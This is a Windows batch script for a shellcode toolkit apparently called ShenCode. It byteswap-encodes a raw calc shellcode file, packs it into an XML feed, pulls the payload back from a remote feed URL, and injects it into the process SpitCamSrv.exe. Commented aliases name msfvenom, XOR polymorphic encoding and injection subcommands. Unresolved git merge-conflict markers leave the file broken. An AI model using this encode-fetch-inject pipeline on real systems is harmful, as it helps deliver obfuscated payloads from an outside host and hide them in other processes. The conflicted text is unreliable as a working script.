@echo off
<<<<<<< Updated upstream
<<<<<<< Updated upstream
rem doskey shen-aes=python3.12 shencode.py aesenc $*
rem doskey shen-ext=python3.12 shencode.py extract $*
rem doskey shen-out=python3.12 shencode.py formatout $*
rem doskey shen-inj=python3.12 shencode.py inject $*
rem doskey shen-msf=python3.12 shencode.py msfvenom $*
rem doskey shen-qrc=python3.12 shencode.py qrcode $*
rem doskey shen-ror=python3.12 shencode.py ror2rol $*
rem doskey shen-uid=python3.12 shencode.py uuid $*
rem doskey shen-xop=python3.12 shencode.py xorpoly $*
rem doskey shen-xoe=python3.12 shencode.py xorenc $*
doskey shc=python3.12 shencode.py $*
doskey /MACROS
=======
=======
>>>>>>> Stashed changes
set scenc=dev\auto-bs.enc
set scraw=dev\calc.raw
set sckey=69
set scxml=dev\auto-bs.xml
set scweb=dev\auto-bs.web
set scuri=https://www.nosociety.de/feed-test/feed.xml
python shencode.py byteswap -i %scraw% -o %scenc% -k %sckey%
python shencode.py feed -i %scenc% -o %scxml%
pause
python shencode.py feed -o %scweb% -r -u %scuri%
<<<<<<< Updated upstream
python shencode.py inject -i %scweb% -p SpitCamSrv.exe
>>>>>>> Stashed changes
=======
python shencode.py inject -i %scweb% -p SpitCamSrv.exe
>>>>>>> Stashed changes
